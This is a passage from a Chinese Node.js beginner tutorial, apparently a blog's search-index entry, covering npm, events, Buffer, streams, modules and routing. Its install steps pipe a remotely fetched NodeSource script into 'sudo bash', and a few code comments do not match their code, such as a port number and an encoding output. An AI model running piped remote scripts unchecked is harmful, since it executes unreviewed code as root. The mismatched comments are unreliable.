End","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"https://banjinmei.github.io/tags/Node-js/"},{"name":"util","slug":"util","permalink":"https://banjinmei.github.io/tags/util/"},{"name":"file","slug":"file","permalink":"https://banjinmei.github.io/tags/file/"},{"name":"getpost","slug":"getpost","permalink":"https://banjinmei.github.io/tags/getpost/"},{"name":"web","slug":"web","permalink":"https://banjinmei.github.io/tags/web/"},{"name":"express","slug":"express","permalink":"https://banjinmei.github.io/tags/express/"},{"name":"child_process","slug":"child-process","permalink":"https://banjinmei.github.io/tags/child-process/"},{"name":"mogodb","slug":"mogodb","permalink":"https://banjinmei.github.io/tags/mogodb/"}],"author":"mu"},{"title":"Nodejs base","slug":"Nodejs-Base","date":"2024-05-17T11:00:03.000Z","updated":"2024-12-02T17:11:50.901Z","comments":true,"path":"2024/05/17/Nodejs-Base/","permalink":"https://banjinmei.github.io/2024/05/17/Nodejs-Base/","excerpt":"","text":"简单的说 Node.js 就是运行在服务端的 JavaScript。 Node.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。 Node.js 是一个事件驱动 I&#x2F;O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。 🛠Node.js安装 Node.js安装在上一篇文章Debian Node.js HEXO 有讲到 截至目前最新的版本是20.12.2 #查看版本 node -v v20.12.2 win下可以在官网下载安装 https://nodejs.org/en/download debian nodejsnode 14版本 1$ apt-get update 1$ curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash - #如果提示sudo 命令没有找到，一定要下载，执行apt-get install sudo -y 即可，然后再执行上述命令 1$ apt-get install nodejs -y 1$ node --version //验证当然如果需要安装node20版本，只需将上述命令替换为： 1$ curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 💬helloworld hi.js 1console.log(&quot;hello world node.js &quot;) // like javascript~ node hi.js [20240504n11] 👩‍🏫Node.js 创建第一个应用require 指令 1var http = require(&quot;http&quot;); 创建服务器&#x2F;接收响应请求 1234567891011121314151617var http = require(&#x27;http&#x27;);http.createServer(function (request, response) &#123; // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;); // 发送响应数据 &quot;Hello World&quot; response.end(&#x27;Hello World\\n&#x27;);&#125;).listen(8888);// 终端打印如下信息console.log(&#x27;Server running at http://127.0.0.1:1200/&#x27;); 🚀npm使用 npm 是包管理工具 允许用户从NPM服务器下载别人编写的第三方包到本地使用。 允许用户从NPM服务器下载并安装别人编写的命令行程序到本地使用。 允许用户将自己编写的包或命令行程序上传到NPM服务器供别人使用。 npm -v 如果你安装的是旧版本的 npm，可以很容易得通过 npm 命令来升级，命令如下： $ sudo npm install npm -g &#x2F;usr&#x2F;local&#x2F;bin&#x2F;npm -&gt; &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;npm&#x2F;bin&#x2F;npm-cli.js &#110;&#112;&#109;&#x40;&#x32;&#x2e;&#x31;&#x34;&#x2e;&#x32; &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;npm 如果是 Window 系统使用以下命令即可： npm install npm -g 使用淘宝镜像的命令： npm install -g cnpm –registry&#x3D;https://registry.npmmirror.com 全局安装与本地安装 npm 的包安装分为本地安装（local）、全局安装（global）两种，从敲的命令行来看，差别只是有没有-g而已，比如 npm install express # 本地安装 npm install express -g # 全局安装 如果出现以下错误： npm err! Error: connect ECONNREFUSED 127.0.0.1:8087 解决办法为： $ npm config set proxy null 查看安装信息 npm list ── &#x65;&#120;&#x70;&#114;&#101;&#x73;&#115;&#64;&#52;&#46;&#49;&#57;&#46;&#x32; npm list -g 使用package.json -node_modules&#x2F;express&#x2F;package.json 内容： Package.json 属性说明 name - 包名。 version - 包的版本号。 description - 包的描述。 homepage - 包的官网 url 。 author - 包的作者姓名。 contributors - 包的其他贡献者姓名。 dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。 repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。 main - main 字段指定了程序的主入口文件，require(‘moduleName’) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。 keywords - 关键字 卸载 12npm uninstall expressnpm ls 更新 12npm update express 创建 1npm init This utility will walk you through creating a package.json file. It only covers the most common items, and tries to guess sensible defaults. See npm help json for definitive documentation on these fields and exactly what they do. Use npm install &lt;pkg&gt; --save afterwards to install a package and save it as a dependency in the package.json file. Press ^C at any time to quit. name: (node_modules) runoob # 模块名 version: (1.0.0) description: Node.js 测试模块(www.runoob.com) # 描述 entry point: (index.js) test command: make test git repository: https://github.com/runoob/runoob.git # Github 地址 keywords: author: license: (ISC) About to write to ……&#x2F;node_modules&#x2F;package.json: # 生成地址 { “name”: “runoob”, “version”: “1.0.0”, “description”: “Node.js 测试模块(www.runoob.com)”, …… } Is this ok? (yes) yes yes后会生成 package.json npm adduser Username: mcmohd Password: Email: (this IS public) &#109;&#x63;&#109;&#111;&#104;&#x64;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109; 发布 npm publish 就可以跟其他模块一样使用 npm 来安装 🔭Node.js 回调函数 Node.js 异步编程的直接体现就是回调。 异步编程依托于回调来实现，但不能说使用了回调后程序就异步化了。 回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。 例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I&#x2F;O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。 回调函数一般作为函数的最后一个参数出现： 12function foo1(name, age, callback) &#123; &#125;function foo2(value, callback1, callback2) &#123; &#125; 阻塞代码实例 创建一个文件 x.txt ，内容如下： hi hi hi 创建 main.js 文件, 代码如下： 1234567var fs = require(&quot;fs&quot;);var data = fs.readFileSync(&#x27;x.txt&#x27;);console.log(data.toString());console.log(&quot;程序执行结束!&quot;); 以上代码执行结果如下： node main.js hi hi hi 程序执行结束! 非阻塞代码实例 创建一个文件 input.txt ，内容如下： 菜鸟教程官网地址：www.runoob.com 创建 main.js 文件, 代码如下： 12345678var fs = require(&quot;fs&quot;);fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) return console.error(err); console.log(data.toString());&#125;);console.log(&quot;程序执行结束!&quot;); 以上代码执行结果如下： node main.js 程序执行结束! hi hi hi 以上两个实例我们了解了阻塞与非阻塞调用的不同。第一个实例在文件读取完后才执行程序。 第二个实例我们不需要等待文件读取完，这样就可以在读取文件时同时执行接下来的代码，大大提高了程序的性能。 因此，阻塞是按顺序执行的，而非阻塞是不需要按顺序的，所以如果需要处理回调函数的参数，我们就需要写在回调函数内。 🐞Node.js 事件循环 Node.js 是单进程单线程应用程序，但是因为 V8 引擎提供的异步执行回调接口，通过这些接口可以处理大量的并发，所以性能非常高。 Node.js 几乎每一个 API 都是支持回调函数的。 Node.js 基本上所有的事件机制都是用设计模式中观察者模式实现。 Node.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数. 事件驱动程序 Node.js 使用事件驱动模型，当web server接收到请求，就把它关闭然后进行处理，然后去服务下一个web请求。 当这个请求完成，它被放回处理队列，当到达队列开头，这个结果被返回给用户。 这个模型非常高效可扩展性非常强，因为 webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO） 在事件驱动模型中，会生成一个主循环来监听事件，当检测到事件时触发回调函数。 EventEmitters -&gt; Events &#x3D;&gt;&lt;&#x3D; EventLoop -&gt; Event Handlers 整个事件驱动的流程就是这么实现的，非常简洁。有点类似于观察者模式，事件相当于一个主题(Subject)，而所有注册到这个事件上的处理函数相当于观察者(Observer)。 Node.js 有多个内置的事件，我们可以通过引入 events 模块，并通过实例化 EventEmitter 类来绑定和监听事件，如下实例： 1234// 引入 events 模块var events = require(&#x27;events&#x27;);// 创建 eventEmitter 对象var eventEmitter = new events.EventEmitter(); 以下程序绑定事件处理程序： 12// 绑定事件及事件的处理程序eventEmitter.on(&#x27;eventName&#x27;, eventHandler); 我们可以通过程序触发事件： 12// 触发事件eventEmitter.emit(&#x27;eventName&#x27;); main.js 1234567891011121314151617181920212223242526// 引入 events 模块var events = require(&#x27;events&#x27;);// 创建 eventEmitter 对象var eventEmitter = new events.EventEmitter();// 创建事件处理程序var connectHandler = function connected() &#123; console.log(&#x27;连接成功。&#x27;); // 触发 data_received 事件 eventEmitter.emit(&#x27;data_received&#x27;);&#125;// 绑定 connection 事件处理程序eventEmitter.on(&#x27;connection&#x27;, connectHandler);// 使用匿名函数绑定 data_received 事件eventEmitter.on(&#x27;data_received&#x27;, function()&#123; console.log(&#x27;数据接收成功。&#x27;);&#125;);// 触发 connection 事件 eventEmitter.emit(&#x27;connection&#x27;);console.log(&quot;程序执行完毕。&quot;); connection -&gt; connectHandler -&gt; data_received 12345node main.js连接成功。数据接收成功。程序执行完毕。 Node 应用程序是如何工作的？ 在 Node 应用程序中，执行异步操作的函数将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。 接下来让我们来重新看下前面的实例，创建一个 x.txt ,文件内容如下： 123456789101112//main.jsvar fs = require(&quot;fs&quot;);fs.readFile(&#x27;x.txt&#x27;, function (err, data) &#123; if (err)&#123; console.log(err.stack); return; &#125; console.log(data.toString());&#125;);console.log(&quot;程序执行完毕&quot;); 执行 则异步读取x.txt内容 把路劲改成 x1.txt读取错误则log 错误内容 📔Node.js EventEmitter Node.js 所有的异步 I&#x2F;O 操作在完成时都会发送一个事件到事件队列。 Node.js 里面的许多对象都会分发事件：一个 net.Server 对象会在每次有新连接时触发一个事件， 一个 fs.readStream 对象会在文件被打开的时候触发一个事件。 所有这些产生事件的对象都是 events.EventEmitter 的实例。 123456789//main.js 文件var EventEmitter = require(&#x27;events&#x27;).EventEmitter; var event = new EventEmitter(); event.on(&#x27;some_event&#x27;, function() &#123; console.log(&#x27;some_event 事件触发&#x27;); &#125;); setTimeout(function() &#123; event.emit(&#x27;some_event&#x27;); &#125;, 10000); 10s后执行 some_event 输出 事件触发 EventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。 当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。 1234567891011//main.js 文件var events = require(&#x27;events&#x27;); var emitter = new events.EventEmitter(); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener1&#x27;, arg1, arg2); &#125;); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener2&#x27;, arg1, arg2); &#125;); emitter.emit(&#x27;someEvent&#x27;, &#x27;arg1 参数&#x27;, &#x27;arg2 参数&#x27;); emitter 为事件 someEvent 注册了两个事件监听器，然后触发了 someEvent 事件。 运行结果中可以看到两个事件监听器回调函数被先后调用。 这就是EventEmitter最简单的用法。 EventEmitter 提供了多个属性，如 on 和 emit。on 函数用于绑定事件函数，emit 属性用于触发一个事件。接下来我们来具体看下 EventEmitter 的属性介绍。 .once 监听器最多只会触发一次，触发后立刻解除该监听器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var events = require(&#x27;events&#x27;);var eventEmitter = new events.EventEmitter();// 监听器 #1var listener1 = function listener1() &#123; console.log(&#x27;监听器 listener1 执行。&#x27;);&#125;// 监听器 #2var listener2 = function listener2() &#123; console.log(&#x27;监听器 listener2 执行。&#x27;);&#125;// 绑定 connection 事件，处理函数为 listener1 eventEmitter.addListener(&#x27;connection&#x27;, listener1);// 绑定 connection 事件，处理函数为 listener2eventEmitter.on(&#x27;connection&#x27;, listener2);var eventListeners = eventEmitter.listenerCount(&#x27;connection&#x27;);console.log(eventListeners + &quot; 个监听器监听连接事件。&quot;);// 处理 connection 事件 eventEmitter.emit(&#x27;connection&#x27;);// 移除监绑定的 listener1 函数eventEmitter.removeListener(&#x27;connection&#x27;, listener1);console.log(&quot;listener1 不再受监听。&quot;);// 触发连接事件eventEmitter.emit(&#x27;connection&#x27;);eventListeners = eventEmitter.listenerCount(&#x27;connection&#x27;);console.log(eventListeners + &quot; 个监听器监听连接事件。&quot;);// 绑定 connection 事件，处理函数为 listener2eventEmitter.on(&#x27;connection&#x27;, listener2);eventEmitter.emit(&#x27;connection&#x27;);eventListeners = eventEmitter.listenerCount(&#x27;connection&#x27;);console.log(eventListeners + &quot; 个监听器监听连接事件。&quot;);console.log(&quot;程序执行完毕。&quot;); error 事件 EventEmitter 定义了一个特殊的事件 error，它包含了错误的语义，我们在遇到 异常的时候通常会触发 error 事件。 当 error 被触发时，EventEmitter 规定如果没有响 应的监听器，Node.js 会把它当作异常，退出程序并输出错误信息。 我们一般要为会触发 error 事件的对象设置监听器，避免遇到错误后整个程序崩溃。例如： 继承 EventEmitter 大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。 为什么要这样做呢？原因有两点： 首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。 其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。 ⛏ Node.js Buffer JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。 但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。 在 Node.js 中，Buffer 类是随 Node 内核一起发布的核心库。Buffer 库为 Node.js 带来了一种存储原始数据的方法，可以让 Node.js 处理二进制数据，每当需要在 Node.js 中处理I&#x2F;O操作中移动的数据时，就有可能使用 Buffer 库。原始数据存储在 Buffer 类的实例中。一个 Buffer 类似于一个整数数组，但它对应于 V8 堆内存之外的一块原始内存。 Buffer 与字符编码 Buffer 实例一般用于表示编码字符的序列，比如 UTF-8 、 UCS2 、 Base64 、或十六进制编码的数据。 通过使用显式的字符编码，就可以在 Buffer 实例与普通的 JavaScript 字符串之间进行相互转换。 Buffer.from() 创建对象 1234567891011121314151617181920const buf = Buffer.from(&#x27;test&#x27;, &#x27;ascii&#x27;);// 输出 72756e6f6f62console.log(buf.toString(&#x27;hex&#x27;));// 输出 cnVub29iconsole.log(buf.toString(&#x27;base64&#x27;));//UTF-8console.log(buf.toString(&#x27;UTF-8&#x27;));//ascii console.log(buf.toString(&#x27;ascii&#x27;)); //utf16le console.log(buf.toString(&#x27;utf16le&#x27;)); //latin1 console.log(buf.toString(&#x27;latin1&#x27;)); Node.js 目前支持的字符编码包括： ascii - 仅支持 7 位 ASCII 数据。如果设置去掉高位的话，这种编码是非常快的。 utf8 - 多字节编码的 Unicode 字符。许多网页和其他文档格式都使用 UTF-8 。 utf16le - 2 或 4 个字节，小字节序编码的 Unicode 字符。支持代理对（U+10000 至 U+10FFFF）。 ucs2 - utf16le 的别名。 base64 - Base64 编码。 latin1 - 一种把 Buffer 编码成一字节编码的字符串的方式。 binary - latin1 的别名。 hex - 将每个字节编码为两个十六进制字符。 创建 Buffer 类 Buffer 提供了以下 API 来创建 Buffer 类： Buffer.alloc(size[, fill[, encoding]])： 返回一个指定大小的 Buffer 实例，如果没有设置 fill，则默认填满 0 Buffer.allocUnsafe(size)： 返回一个指定大小的 Buffer 实例，但是它不会被初始化，所以它可能包含敏感的数据 Buffer.allocUnsafeSlow(size) Buffer.from(array)： 返回一个被 array 的值初始化的新的 Buffer 实例（传入的 array 的元素只能是数字，不然就会自动被 0 覆盖） Buffer.from(arrayBuffer[, byteOffset[, length]])： 返回一个新建的与给定的 ArrayBuffer 共享同一内存的 Buffer。 Buffer.from(buffer)： 复制传入的 Buffer 实例的数据，并返回一个新的 Buffer 实例 Buffer.from(string[, encoding])： 返回一个被 string 的值初始化的新的 Buffer 实例 写入缓冲区 语法 写入 Node 缓冲区的语法如下所示： 12buf.write(string[, offset[, length]][, encoding]) 参数 参数描述如下： string - 写入缓冲区的字符串。 offset - 缓冲区开始写入的索引值，默认为 0 。 length - 写入的字节数，默认为 buffer.length encoding - 使用的编码。默认为 ‘utf8’ 。 根据 encoding 的字符编码写入 string 到 buf 中的 offset 位置。 length 参数是写入的字节数。 如果 buf 没有足够的空间保存整个字符串，则只会写入 string 的一部分。 只部分解码的字符不会被写入。 返回值 返回实际写入的大小。如果 buffer 空间不足， 则只会写入部分字符串。 实例 1234buf = Buffer.alloc(256);len = buf.write(&quot;123123&quot;);console.log(&quot;写入字节数 : &quot;+ len); 从缓冲区读取数据 语法 读取 Node 缓冲区数据的语法如下所示： 1buf.toString([encoding[, start[, end]]]) 参数 参数描述如下： encoding - 使用的编码。默认为 ‘utf8’ 。 start - 指定开始读取的索引位置，默认为 0。 end - 结束位置，默认为缓冲区的末尾。 返回值 解码缓冲区数据并使用指定的编码返回字符串。 实例 12345678910buf = Buffer.alloc(26);for (var i = 0 ; i &lt; 26 ; i++) &#123; buf[i] = i + 97;&#125;console.log( buf.toString(&#x27;ascii&#x27;)); // 输出: abcdefghijklmnopqrstuvwxyzconsole.log( buf.toString(&#x27;ascii&#x27;,0,5)); //使用 &#x27;ascii&#x27; 编码, 并输出: abcdeconsole.log( buf.toString(&#x27;utf8&#x27;,0,5)); // 使用 &#x27;utf8&#x27; 编码, 并输出: abcdeconsole.log( buf.toString(undefined,0,5)); // 使用默认的 &#x27;utf8&#x27; 编码, 并输出: abcde 将 Buffer 转换为 JSON 对象 语法 将 Node Buffer 转换为 JSON 对象的函数语法格式如下： 1buf.toJSON() 123456789101112131415const buf = Buffer.from([0x1, 0x2, 0x3, 0x4, 0x5]);const json = JSON.stringify(buf);// 输出: &#123;&quot;type&quot;:&quot;Buffer&quot;,&quot;data&quot;:[1,2,3,4,5]&#125;console.log(json);const copy = JSON.parse(json, (key, value) =&gt; &#123; return value &amp;&amp; value.type === &#x27;Buffer&#x27; ? Buffer.from(value.data) : value;&#125;);// 输出: &lt;Buffer 01 02 03 04 05&gt;console.log(copy); 缓冲区合并 语法 Node 缓冲区合并的语法如下所示： 1Buffer.concat(list[, totalLength]) 1234567var buffer1 = Buffer.from((&#x27;123&#x27;));var buffer2 = Buffer.from((&#x27;test&#x27;));var buffer3 = Buffer.concat([buffer1,buffer2]);console.log(&quot;buffer3 内容: &quot; + buffer3.toString()); 缓冲区比较 语法 Node Buffer 比较的函数语法如下所示, 该方法在 Node.js v0.12.2 版本引入： 12buf.compare(otherBuffer); 12345678910111213var buffer1 = Buffer.from(&#x27;ABC&#x27;);var buffer2 = Buffer.from(&#x27;ABCD&#x27;);var result = buffer1.compare(buffer2);if(result &lt; 0) &#123; console.log(buffer1 + &quot; 在 &quot; + buffer2 + &quot;之前&quot;);&#125;else if(result == 0)&#123; console.log(buffer1 + &quot; 与 &quot; + buffer2 + &quot;相同&quot;);&#125;else &#123; console.log(buffer1 + &quot; 在 &quot; + buffer2 + &quot;之后&quot;);&#125; 拷贝缓冲区 语法 Node 缓冲区拷贝语法如下所示： 1buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]]) 12345678var buf1 = Buffer.from(&#x27;abcdefghijkl&#x27;);var buf2 = Buffer.from(&#x27;123&#x27;);//将 buf2 插入到 buf1 指定位置上buf2.copy(buf1, 2);console.log(buf1.toString()); 缓冲区裁剪 Node 缓冲区裁剪语法如下所示： 12buf.slice([start[, end]]) 12345var buffer1 = Buffer.from(&#x27;TEST123TEST&#x27;);// 剪切缓冲区var buffer2 = buffer1.slice(0,2);console.log(&quot;buffer2 content: &quot; + buffer2.toString()); 缓冲区长度 语法 Node 缓冲区长度计算语法如下所示： 1buf.length; 12345var buffer = Buffer.from(&#x27;123123123&#x27;);// 缓冲区长度console.log(&quot;buffer length: &quot; + buffer.length); 👨‍💻Node.js Stream Node.js Stream(流) Stream 是一个抽象接口，Node 中有很多对象实现了这个接口。例如，对http 服务器发起请求的request 对象就是一个 Stream，还有stdout（标准输出）。 Node.js，Stream 有四种流类型： Readable - 可读操作。 Writable - 可写操作。 Duplex - 可读可写操作. Transform - 操作被写入数据，然后读出结果。 所有的 Stream 对象都是 EventEmitter 的实例。常用的事件有： data - 当有数据可读时触发。 end - 没有更多的数据可读时触发。 error - 在接收和写入过程中发生错误时触发。 finish - 所有数据已被写入到底层系统时触发。 123456789101112131415161718192021222324var fs = require(&quot;fs&quot;);var data = &#x27;&#x27;;// 创建可读流var readerStream = fs.createReadStream(&#x27;x.txt&#x27;);// 设置编码为 utf8。readerStream.setEncoding(&#x27;UTF8&#x27;);// 处理流事件 --&gt; data, end, and errorreaderStream.on(&#x27;data&#x27;, function(chunk) &#123; data += chunk;&#125;);readerStream.on(&#x27;end&#x27;,function()&#123; console.log(data);&#125;);readerStream.on(&#x27;error&#x27;, function(err)&#123; console.log(err.stack);&#125;);console.log(&quot;程序执行完毕&quot;); 写入流 1234567891011var fs = require(&quot;fs&quot;);var data = &#x27;&#x27;;var dataw = &#x27;w123w&#x27;;var ws = fs.createWriteStream(&#x27;x.txt&#x27;);ws.write(dataw); ws.end();console.log(&quot;数据写入成功！&quot;); 管道流 管道提供了一个输出流到输入流的机制。通常我们用于从一个流中获取数据并将数据传递到另外一个流中。 12345678910111213var fs = require(&quot;fs&quot;);// 创建一个可读流var readerStream = fs.createReadStream(&#x27;x.txt&#x27;);// 创建一个可写流var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// 管道读写操作// 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中readerStream.pipe(writerStream);console.log(&quot;程序执行完毕&quot;); 链式流 链式是通过连接输出流到另外一个流并创建多个流操作链的机制。链式流一般用于管道操作。 接下来我们就是用管道和链式来压缩和解压文件。 12345678910var fs = require(&quot;fs&quot;);var zlib = require(&#x27;zlib&#x27;);// 压缩 input.txt 文件为 input.txt.gzfs.createReadStream(&#x27;x.txt&#x27;) .pipe(zlib.createGzip()).pipe(fs.createWriteStream(&#x27;input.txt.gz&#x27;)); console.log(&quot;文件压缩完成。&quot;); 12345678910var fs = require(&quot;fs&quot;);var zlib = require(&#x27;zlib&#x27;);// 解压 input.txt.gz 文件为 input.txtfs.createReadStream(&#x27;input.txt.gz&#x27;) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(&#x27;input2.txt&#x27;)); console.log(&quot;文件解压完成。&quot;); 📝Node.js 模块系统 ~~ 为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。 模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C&#x2F;C++ 扩展。 12345//hello.jsexports.world1 = function() &#123; console.log(&quot;hello world node.js &quot;) &#125; 123//test.jsvar hello = require(&#x27;./hello&#x27;);hello.world1(); hello.js 通过 exports 对象把 world1 作为模块的访问接口，在 main.js 中通过 require(‘.&#x2F;hello’) 加载这个模块，然后就可以直接访 问 hello.js 中 exports 对象的成员函数了。 123456789101112//hello.js function Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log(&#x27;Hello &#x27; + name); &#125;; &#125;; module.exports = Hello; 12345//test.js var Hello = require(&#x27;./hello&#x27;); hello = new Hello(); hello.setName(&#x27;vvv&#x27;); hello.sayHello(); 模块接口的唯一变化是使用 module.exports &#x3D; Hello 代替了exports.world &#x3D; function(){}。 在外部引用该模块时，其接口对象就是要输出的 Hello 对象本身，而不是原先的 exports。 exports 和 module.exports 的使用 如果要对外暴露属性或方法，就用 exports 就行，要暴露对象(类似class，包含了很多属性和方法)，就用 module.exports。 PS 模块加载 从文件模块缓存中加载 尽管原生模块与文件模块的优先级不同，但是都会优先从文件模块的缓存中加载已经存在的模块。 从原生模块加载 原生模块的优先级仅次于文件模块缓存的优先级。require 方法在解析文件名之后，优先检查模块是否在原生模块列表中。以http模块为例，尽管在目录下存在一个 http&#x2F;http.js&#x2F;http.node&#x2F;http.json 文件，require(“http”) 都不会从这些文件中加载，而是从原生模块中加载。 原生模块也有一个缓存区，同样也是优先从缓存区加载。如果缓存区没有被加载过，则调用原生模块的加载方式进行加载和执行。 从文件加载 当文件模块缓存中不存在，而且不是原生模块的时候，Node.js 会解析 require 方法传入的参数，并从文件系统中加载实际的文件，加载过程中的包装和编译细节在前一节中已经介绍过，这里我们将详细描述查找文件模块的过程，其中，也有一些细节值得知晓。 require方法接受以下几种参数的传递： http、fs、path等，原生模块。 .&#x2F;mod或..&#x2F;mod，相对路径的文件模块。 &#x2F;pathtomodule&#x2F;mod，绝对路径的文件模块。 mod，非原生模块的文件模块。 🔄nodejs 加载c++ 在Node.js中加载C++代码，通常是通过编写一个C++的扩展模块，然后通过Node.js的require方法加载这个模块。这可以通过Node.js的原生扩展模块API实现，也可以通过N-API实现，这是一个为构建可以在多个Node.js版本上工作的原生扩展模块而设计的API。 以下是一个简单的例子，展示如何创建一个C++扩展模块并在Node.js中使用它。 首先，你需要安装一个名为node-gyp的工具，这是一个用来编译C++扩展模块的工具： npm install -g node-gyp 然后，创建一个名为binding.gyp的文件，它描述了如何构建扩展模块： 12345678&#123; &quot;targets&quot;: [ &#123; &quot;target_name&quot;: &quot;addon&quot;, &quot;sources&quot;: [ &quot;addon.cc&quot; ] &#125; ]&#125; 接下来，创建一个C++源文件，例如addon.cc，它包含了你的C++代码： 123456789101112131415161718192021222324#include &lt;node.h&gt;namespace demo &#123;using v8::FunctionCallbackInfo;using v8::Isolate;using v8::Local;using v8::NewStringType;using v8::Object;using v8::String;using v8::Value;void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); args.GetReturnValue().Set(String::NewFromUtf8(isolate, &quot;world&quot;, NewStringType::kNormal).ToLocalChecked());&#125;void Initialize(Local&lt;Object&gt; exports) &#123; NODE_SET_METHOD(exports, &quot;hello&quot;, Method);&#125;NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)&#125; // namespace demo 确保在binding.gyp文件的同一目录下，运行以下命令来构建扩展模块： 1node-gyp configure build 这将生成一个编译好的扩展模块，你可以在Node.js中通过require来加载并使用它： 123const addon = require(&#x27;./build/Release/addon.node&#x27;);console.log(addon.hello()); // 输出: world 在这个例子中，C++模块导出了一个名为hello的方法，当在Node.js中调用这个方法时，它返回字符串”world”。 🙋‍♀️Node.js 函数 在 JavaScript中，一个函数可以作为另一个函数的参数。我们可以先定义一个函数，然后传递，也可以在传递参数的地方直接定义函数。 Node.js 中函数的使用与 JavaScript 类似，举例来说，你可以这样做： 123456789function say(word) &#123; console.log(word);&#125;function execute(someFunction, value) &#123; someFunction(value);&#125;execute(say, &quot;Hello&quot;); 以上代码中，我们把 say 函数作为 execute 函数的第一个变量进行了传递。这里传递的不是 say 的返回值，而是 say 本身！ 这样一来， say 就变成了execute 中的本地变量 someFunction ，execute 可以通过调用 someFunction() （带括号的形式）来使用 say 函数。 当然，因为 say 有一个变量， execute 在调用 someFunction 时可以传递这样一个变量。 匿名函数 1234567function execute(someFunction, value) &#123; someFunction(value);&#125;execute(function(word)&#123; console.log(word) &#125;, &quot;Hello&quot;); 传递 12345678910var http = require(&quot;http&quot;);function onRequest(request, response) &#123; response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end();&#125;http.createServer(onRequest).listen(8888); &#x3D;&#x3D;&gt; 123456789var http = require(&quot;http&quot;);http.createServer(function(request, response) &#123; response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end();&#125;).listen(8888); 🙋‍♂Node.js 箭头函数 在Node.js中，箭头函数是一种简洁写法，用于声明匿名函数。它们最常用于回调函数和事件监听器等场景。箭头函数的语法很简单，它的基本格式如下： 1234(param1, param2, ...) =&gt; &#123; // 函数体 return something;&#125; 123const numbers = [1, 2, 3, 4, 5];const doubled = numbers.map(number =&gt; number * 2);console.log(doubled); // 输出: [2, 4, 6, 8, 10] 123setTimeout(() =&gt; &#123; console.log(&#x27;hihihi.&#x27;);&#125;, 2000); 以上决策图看起来有点复杂，我认为有三点比较重要： 箭头函数适合于无复杂逻辑或者无副作用的纯函数场景下，例如用在 map 、 reduce 、 filter 的回调函数定义中； 不要在最外层定义箭头函数，因为在函数内部操作 this 会很容易污染全局作用域。最起码在箭头函数外部包一层普通函数，将 this 控制在可见的范围内； 如开头所述，箭头函数最吸引人的地方是简洁。在有多层函数嵌套的情况下，箭头函数的简洁性并没有很大的提升，反而影响了函数的作用范围的识别度，这种情况不建议使用箭头函数。 🧪Node.js 路由 在 Node.js 中，路由（Routing）是指确定如何响应对特定端点（URL 路径）的 HTTP 请求的过程。 我们要为路由提供请求的 URL 和其他需要的 GET 及 POST 参数，随后路由需要根据这些数据来执行相应的代码。 因此，我们需要查看 HTTP 请求，从中提取出请求的 URL 以及 GET&#x2F;POST 参数。这一功能应当属于路由还是服务器（甚至作为一个模块自身的功能）确实值得探讨，但这里暂定其为我们的HTTP服务器的功能。 我们需要的所有数据都会包含在 request 对象中，该对象作为 onRequest() 回调函数的第一个参数传递。但是为了解析这些数据，我们需要额外的 Node.JS 模块，它们分别是 url 和 querystring 模块。 url.parse(string).query | url.parse(string).pathname | | | | | ------ ------------------- http://localhost:8888/start?foo=bar&amp;hello=world — —– | | | | querystring.parse(queryString)[“foo”] | | querystring.parse(queryString)[“hello”] 现在我们来给 onRequest() 